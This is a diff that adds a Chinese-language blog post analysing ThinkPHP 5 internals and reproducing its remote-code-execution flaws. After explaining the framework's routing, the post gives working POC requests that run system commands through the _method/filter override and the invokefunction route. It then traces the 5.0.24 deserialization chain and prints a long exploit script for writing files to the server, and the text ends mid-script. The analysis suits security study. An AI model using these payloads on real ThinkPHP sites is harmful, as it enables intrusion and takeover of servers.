@@ -190,7 +190,234 @@
       
         
       
+        
+      
     
+    
+      
+        <div class="post-wrapper">
+          <article class="post reveal no-title">
+    
+<section class="meta">
+  
+  <div class="meta" id="header-meta">
+    
+      <h2 class="title">
+          <a href="/2020/07/30/test/">
+              
+                  2020-07-30
+              
+          </a>
+      </h2>
+    
+
+    
+      <time class="metatag time">
+        <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;2020-07-30
+      </time>
+    
+
+    
+      
+
+    
+
+    
+
+    
+
+  </div>
+</section>
+
+    <section class="article typo">
+        <h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><p>以TP5.0.22为例 + PHP 5.6.27-NTS + phpstorm2020.1<br>反序列化环境为:TP5.0.24 + PHP 5.6.27-NTS + phpstorm2020.1</p>
+<p><strong>前排提醒：</strong> 现如今流传的POC不一定通杀全版本，需要根据目标所在的环境以及版本进行适当的修改</p>
+<h1 id="目录架构"><a href="#目录架构" class="headerlink" title="目录架构"></a>目录架构</h1><p>根据类的命名空间可以快速定位文件位置，在ThinkPHP5.0的规范里面，命名空间其实对应了文件的所在目录，app命名空间通常代表了文件的起始目录为application，而think命名空间则代表了文件的其实目录为thinkphp/library/think，后面的命名空间则表示从起始目录开始的子目录，如下图所示：<br><img src="/2020/07/30/test/ThinkPHP5底层代码逻辑梳理/1.png" alt=""></p>
+<h1 id="框架流程"><a href="#框架流程" class="headerlink" title="框架流程"></a>框架流程</h1><p>我们先进入到默认的入口文件（public/index.php）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义应用目录</span></span><br><span class="line">define(<span class="string">'APP_PATH'</span>, <span class="keyword">__DIR__</span> . <span class="string">'/../application/'</span>);</span><br><span class="line"><span class="comment">// 加载框架引导文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/../thinkphp/start.php'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>引入start.php进入到里面看看有什么</p>
+<h2 id="框架引导文件（thinkphp-start-php）"><a href="#框架引导文件（thinkphp-start-php）" class="headerlink" title="框架引导文件（thinkphp/start.php）"></a>框架引导文件（thinkphp/start.php）</h2><p>进入框架引导文件看到两行代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 1. 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/base.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 执行应用</span></span><br><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure></p>
+<h3 id="基础文件（thinkphp-base-php）"><a href="#基础文件（thinkphp-base-php）" class="headerlink" title="基础文件（thinkphp/base.php）"></a>基础文件（thinkphp/base.php）</h3><p>在此文件首先看到全面大段的是定义常量或者是检查常量是否存在，主要是以下几点需要重点注意</p>
+<ul>
+<li>将Loader类引入</li>
+<li>注册自动加载机制<ul>
+<li>注册系统自动加载，<code>spl_autoload_register</code>将函数注册到SPL __autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。此函数可以注册任意数量的自动加载器，当使用尚未被定义的类（class）和接口（interface）时自动去加载。通过注册自动加载器，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 </li>
+<li>Composer 自动加载支持</li>
+<li>注册命名空间定义:<code>think=&gt;thinkphp/library/think，behavior=&gt;thinkphp/library/behavior，traits=&gt;thinkphp/library/traits</code></li>
+<li>加载类库映射文件</li>
+<li>自动加载 extend 目录</li>
+</ul>
+</li>
+<li>注册异常处理机制</li>
+<li>加载惯例配置</li>
+</ul>
+<h3 id="执行应用（thinkphp-library-think-App-php）"><a href="#执行应用（thinkphp-library-think-App-php）" class="headerlink" title="执行应用（thinkphp/library/think/App.php）"></a>执行应用（thinkphp/library/think/App.php）</h3><p>首先返回一个request实例，将应用初始化返回配置信息。<br>之后进行如下的操作：</p>
+<ul>
+<li>查看是否存在模块控制器绑定</li>
+<li>对于request的实例根据设置的过滤规则进行过滤</li>
+<li>加载语言包</li>
+<li>监听app_dispatch</li>
+<li>进行URL路由检测（routecheck后面细讲）</li>
+<li>记录当前调度信息，路由以及请求信息到日志中</li>
+<li>请求缓存检查并进行<code>$data = self::exec($dispatch, $config);</code>，根据$dispatch进行不同的调度，返回$data</li>
+<li>清除类的实例化</li>
+<li>输出数据到客户端，<code>$response = $data;</code>，返回一个Response类实例</li>
+<li>调用 <strong>Response-&gt;send()</strong> 方法将数据返回值客户端</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>画个图过一遍整个流程<br><img src="/2020/07/30/test/ThinkPHP5底层代码逻辑梳理/2.png" alt=""></p>
+<h2 id="根据PATH-INFO进行URL路由检测（App-routeCheck）"><a href="#根据PATH-INFO进行URL路由检测（App-routeCheck）" class="headerlink" title="根据PATH_INFO进行URL路由检测（App::routeCheck）"></a>根据PATH_INFO进行URL路由检测（App::routeCheck）</h2><p>通过<code>$path   = $request-&gt;path()</code>可以获得到请求的path_info，<code>$depr</code>是定义的分隔符，默认时:<strong>/</strong>，之后进行路由检测步骤如下</p>
+<ul>
+<li>查看是否存在路由缓存，存在就包含</li>
+<li>读取应用所在的路由文件，一般默认为route.php</li>
+<li>导入路由配置</li>
+<li><code>Route::check</code> （根据路由定义返回不同的URL调度）<ul>
+<li>检查解析缓存</li>
+<li>替换分隔符，将”/“换成了”|”</li>
+<li>获取当前请求类型的路由规则，由于在之前的 <strong>Composer 自动加载支持</strong>，在vendortopthink/think-captcha/src/helper.php中注册了路由，所以在<code>$rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];</code>中的Route::$rules[‘get’]已经存在了相应的路由规则<img src="/2020/07/30/test/ThinkPHP5底层代码逻辑梳理/3.png" alt=""></li>
+<li>检测域名部署</li>
+<li>检测URL绑定</li>
+<li>静态路由规则检查</li>
+<li>路由规则检查<code>self::checkRoute($request, $rules, $url, $depr)</code><ul>
+<li>检查参数有效性</li>
+<li>替换掉路由ext参数</li>
+<li>检查分组路由</li>
+<li>检查指定特殊路由，例如：<code>__miss__</code>和<code>__atuo__</code></li>
+<li>检查路由规则<code>checkRule</code><ul>
+<li>检查完整规则定义</li>
+<li>检查路由的参数分隔符</li>
+<li>检查是否完整匹配路由</li>
+</ul>
+</li>
+<li>最终未被匹配路由的进入到<code>self::parseRule(&#39;&#39;, $miss[&#39;route&#39;], $url, $miss[&#39;option&#39;])</code>进行处理，这就牵涉到TP对于路由的多种定义<img src="/2020/07/30/test/ThinkPHP5底层代码逻辑梳理/4.png" alt=""></li>
+</ul>
+</li>
+<li>检查是否强制使用路由<code>$must   = !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;]</code></li>
+<li>路由无效，将自动解析模块的URL地址会进入到<code>Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;])</code></li>
+</ul>
+</li>
+<li>最终将结果记录到调度信息</li>
+</ul>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>首先看看路由定义：</p>
+<table>
+<thead>
+<tr>
+<th>定义方式</th>
+<th>定义格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>方式1：路由到模块/控制器</td>
+<td>(模块/控制器/操作)?额外参数1=值1&amp;额外参数2=值2…</td>
+<td></td>
+</tr>
+<tr>
+<td>方式2：路由到重定向地址</td>
+<td>‘外部地址’（默认301重定向） 或者 (‘外部地址’,’重定向代码’)</td>
+</tr>
+<tr>
+<td>方式3：路由到控制器的方法</td>
+<td>‘@(模块/控制器/)操作’</td>
+</tr>
+<tr>
+<td>方式4：路由到类的方法</td>
+<td>‘\完整的命名空间类::静态方法’ 或者 ‘\完整的命名空间类@动态方法’</td>
+</tr>
+<tr>
+<td>方式5：路由到闭包函数</td>
+<td>闭包函数定义（支持参数传入）</td>
+</tr>
+</tbody>
+</table>
+<p>具体链接可以看看这个<a href="https://www.kancloud.cn/manual/thinkphp5/118037" target="_blank" rel="noopener">开发手册</a>    </p>
+<p>在画个图过一遍整个路由流程<br><img src="/2020/07/30/test/ThinkPHP5底层代码逻辑梳理/5.png" alt=""></p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>现在TP的RCE通常将其分成两类：</p>
+<ul>
+<li>Request类其中变量被覆盖导致RCE</li>
+<li>路由控制不严谨导致可以调用任意类致使RCE</li>
+<li>反序列化的应用（需要存在反序列化的地方）</li>
+</ul>
+<h2 id="Request类其中变量被覆盖导致RCE"><a href="#Request类其中变量被覆盖导致RCE" class="headerlink" title="Request类其中变量被覆盖导致RCE"></a>Request类其中变量被覆盖导致RCE</h2><p>我们以这个POC为例，进行复现：<img src="/2020/07/30/test/Thinkphp5-x-RCE复现/1.jpg" alt=""></p>
+<p>我们正常的代码逻辑已经简单的写在了前文，如有代码执行疑惑请在前文寻找答案。</p>
+<p>下面我们进行漏洞跟踪梳理</p>
+<ul>
+<li>App:run()进行启动，进行到URL路由检测<code>self::routeCheck($request, $config)</code><ul>
+<li><code>$request-&gt;path()</code>获取到我们自带的兼容模式参数<strong>s</strong></li>
+<li>进入路由检测<code>Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;])</code><ul>
+<li>关键代码<code>$method = strtolower($request-&gt;method())</code>进入<code>$request-&gt;method()</code>看到在查找$_POST中是否有表单请求类型伪装变量（简单解释一下这个，就是form表单的method只能进行GET和POST请求，如果想进行别的请求例如put、delete可以使用这个伪装变量来进入到相应的路由进行处理）<ul>
+<li>一个PHP经典可变函数进行相关的调用<code>$this-&gt;{$this-&gt;method}($_POST)</code>，根据POC我们就进入到了 <strong>__construct</strong> ，这个东西是PHP魔术方法，进入到里面之后就可以将原先的数据覆盖成我们POST上去的数据，最后返回的是POST上去的method=get<img src="/2020/07/30/test/Thinkphp5-x-RCE复现/2.jpg" alt=""></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>最终返回数据如下图所示并且赋值给$dispatch<img src="/2020/07/30/test/Thinkphp5-x-RCE复现/3.jpg" alt=""></li>
+<li>进入关键代码<code>$data = self::exec($dispatch, $config)</code><ul>
+<li>然后再次进入到回调方法中的<code>Request::instance()-&gt;param()</code>，继续跟踪到<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter)</code>，这个函数解释如下：<img src="/2020/07/30/test/Thinkphp5-x-RCE复现/4.jpg" alt=""></li>
+<li>重要代码跟进，调用<code>call_user_func($filter, $value)</code>将其传入的<code>$filter=system,$value=sysyteminfo</code><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/5.jpg" alt=""></li>
+<li>最后返回的需要进行一次过滤，不过大致查看能发现过滤字符基本为SQL注入的过滤，不是RCE的类型</li>
+<li>现在再次回到<code>call_user_func($filter, $value)</code>因为最终你传入的是一个数组，第一个是需要执行的类型，后面是为null，因此会报错。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>最终进入到\thinkphp\library\think\exception\Handle.php的174行，<code>$data[&#39;echo&#39;] = ob_get_clean()</code>，获取到前面未被赋值的命令执行的结果，从而随着报错页面一起发送给客户端从而达到回显的目的。</li>
+</ul>
+<h3 id="POC版本测试"><a href="#POC版本测试" class="headerlink" title="POC版本测试"></a>POC版本测试</h3><blockquote>
+<p>需要captcha的method路由，如果存在其他method路由，也是可以将captcha换为其他<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.0</span>~<span class="number">5.0</span><span class="number">.23</span>(本人只测了<span class="number">0</span>和<span class="number">23</span>的完整版，那么猜测中间的版本也是通杀没有问题)</span><br><span class="line">POST http:<span class="comment">//localhost/tp/public/index.php?s=captcha</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami</span><br><span class="line"></span><br><span class="line"><span class="number">5.1</span>.x低版本也可行请自行调试寻找</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="需要解释一些问题"><a href="#需要解释一些问题" class="headerlink" title="需要解释一些问题"></a>需要解释一些问题</h3><p>这里简单提一下，我在复盘TP漏洞时看到先知社区一些疑问，已经在讨论区里发表了我的意见。<a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">这篇文章的讨论区</a>，由于TP本身自带错误中断的机制，因此assert不会正常执行。</p>
+<h2 id="路由控制不严谨导致可以调用任意类致使RCE"><a href="#路由控制不严谨导致可以调用任意类致使RCE" class="headerlink" title="路由控制不严谨导致可以调用任意类致使RCE"></a>路由控制不严谨导致可以调用任意类致使RCE</h2><p>我们以这个POC为例<br><a href="http://localhost/tp/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo(" target="_blank" rel="noopener">http://localhost/tp/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</a>)</p>
+<p>正常代码逻辑已经梳理，请自行查看前文。<br>下面进行漏洞逻辑梳理</p>
+<ul>
+<li>进入路由<code>$dispatch = self::routeCheck($request, $config)</code>，最终进入<code>Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;])</code>，通过分隔符替换从而将我们输入的pathinfo信息打散成数组： <strong>index|think\app|invokefunction</strong>，最终返回类似这样的数据<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/6.jpg" alt=""></li>
+<li>进入<code>$data = self::exec($dispatch, $config);</code>将前面获得的调度信息传进去<ul>
+<li>进入<code>$data = self::module($dispatch[&#39;module&#39;],$config,isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null);</code><ul>
+<li>一直跟踪到往下看，这句代码就是为什么我们要在pathinfo中首先要写 <strong>index</strong> ：<code>elseif (!in_array($module, $config[&#39;deny_module_list&#39;]) &amp;&amp; is_dir(APP_PATH . $module))</code>。这样能保证程序不报错中断并且使 <strong>$available=true</strong></li>
+<li>分别将模块、控制器、操作将其赋值为我们所输入的 <strong>index think\app invokefunction</strong></li>
+<li>进入<code>Loader::controller</code>进行控制类调用 <strong>Loader::getModuleAndClass</strong> 使得程序通过 <strong>invokeClass</strong> 返回我们所输入的类的实例</li>
+<li>进入到App::invokeMethod，反射出我们所输入的类的方法信息(ReflectionMethod)，绑定我们输入的参数，进入<code>$reflect-&gt;invokeArgs(isset($class) ? $class : null, $args)</code>那么就可以调用我们所想调用的函数，参数也相应传入<img src="/2020/07/30/test/Thinkphp5-x-RCE复现/6.jpg" alt=""></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>最后跟前面那个漏洞一样，我们所执行的结果会随着报错输出缓冲区一起显示出来。</li>
+</ul>
+<h3 id="POC版本测试-1"><a href="#POC版本测试-1" class="headerlink" title="POC版本测试"></a>POC版本测试</h3><p>因为linux和win的环境不一样导致代码逻辑判断不一样因此需要自行寻找<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.0</span>.x(具体自行测试)</span><br><span class="line">http:<span class="comment">//localhost/tp/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.1</span>.x(具体自行测试，适合linux环境)</span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="TP5-0-24反序列化利用链"><a href="#TP5-0-24反序列化利用链" class="headerlink" title="TP5.0.24反序列化利用链"></a>TP5.0.24反序列化利用链</h2><p>先看看PHP的魔术方法<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/2.jpg" alt=""></p>
+<p>梳理反序列化利用链漏洞首先需要一个漏洞触发点，别问，问就是自己写：<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/8.jpg" alt=""><br>我们发现在 <strong>thinkphp/library/think/process/pipes/Windows.php</strong> 中发现<code>__destruct</code>中存在removeFiles函数，并且在其中存在<code>$this-&gt;files</code>和<code>file_exists</code>，那么我们通过可控的<code>$this-&gt;files</code>利用<code>file_exists</code>可以调用一些类的<code>__toString</code>方法，之后查看此方法在抽象类Model（thinkphp/library/think/Model.php），抽象类不能直接调用，因此需要找他的子类。我们可以找到Pivot（thinkphp/library/think/model/Pivot.php）进行调用<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/9.jpg" alt=""><br>然后从toJson()-&gt;toArray()，我们看到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null</code><br>其中 <strong>$value-&gt;getAttr是我们利用__call魔术方法</strong> 的点，我们来梳理代码逻辑使之可以顺利执行这句代码。<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/10.jpg" alt=""></p>
+<ul>
+<li>$this-&gt;append可以控制，将其变成Model类的getError方法，然后跟进看到此方法存在$this-&gt;error，因此可以控制$this-&gt;$relation()<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/11.jpg" alt=""></li>
+<li>进入到 <strong>getRelationData</strong> 进行一次判断，首先需要进入的是Relation类型的对象，并且要符合这个关键判断<code>$this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code> 才能让$value变成我们想要的东西<ul>
+<li>首先传入的Relation对象是由$this-&gt;$relation()控制，我们可以找到HasOne（thinkphp/library/think/model/relation/HasOne.php）这个类是继承抽象类OneToOne（thinkphp/library/think/model/relation/OnToOne.php），然后OneToOne又继承自Relation，所以HasOne有着Relation的血脉才能进入getRelationData方法</li>
+<li><strong>$this-&gt;parent</strong> 是我们所要进入的__call魔术方法所在的类，这里我们选择的是Output类（thinkphp/library/think/console/Output）</li>
+<li><strong>$modelRelation-&gt;isSelfRelation()</strong> 看到$this-&gt;selfRelation，我们可以控制。</li>
+<li><strong>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</strong>，我们需要将最后Query的$this-&gt;model写成我们选择的Output类</li>
+</ul>
+</li>
+<li>最后$this-&gt;parent赋值给$value，执行代码之后进入到Output类的__call方法</li>
+</ul>
+<p>进入到__call，发现$this-&gt;styles我们可以控制那么就可以执行block方法，block调用writeln方法，writeln调用write方法，发现write方法中<code>$this-&gt;handle-&gt;write($messages, $newline, $type)</code>那么我们可以控制<code>$this-&gt;handle</code>，我们将其设置为Memcached类（thinkphp/library/think/session/driver/Mencached.php），然后进入到Memcached-&gt;write方法中看到Memcached也存在一个$this-&gt;handle，我们将其设置为File类（thinkphp/library/think/cache/driver/File.php）从而进入到File-&gt;set方法我们可以看到<code>file_put_contents($filename, $data)</code>其中的两个参数我们都可以控制<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/12.jpg" alt=""></p>
+<ul>
+<li>首先传入的三个参数已经确定，其中$name，$expire我们可以控制，但是有用的就是$name</li>
+<li>发现写入的数据就是我们无法控制的$value，无法利用。我们不慌继续往下看，看到有一个<code>$this-&gt;setTagItem($filename)</code>我们看到此方法又调用一次set方法并且传入set的三个值我们都可以控制<br><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/13.jpg" alt=""></li>
+<li>再一次进入set方法， <strong>通过php伪协议可以绕过exit()的限制</strong> ，就可以将危害代码写在服务器上了。</li>
+</ul>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>从网上找来的EXP，改了改关键的几个点，并且可以实现在Windows写文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($files)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [$files]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> $error = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($output, $modelRelation)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $output;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">"xxx"</span>=&gt;<span class="string">"getError"</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = $modelRelation;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($output, $modelRelation)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">parent</span>::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindAttr = [];</span><br><span class="line">        <span class="keyword">protected</span> $query;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($query)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = $query;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">'xxx'</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($model)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = $model; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> $styles;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">'getAttr'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =$handle; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = $handle; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> $tag;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">'expire'</span> =&gt; <span class="number">3600</span>, </span><br><span class="line">                <span class="string">'cache_subdir'</span> =&gt; <span class="keyword">false</span>, </span><br><span class="line">                <span class="string">'prefix'</span> =&gt; <span 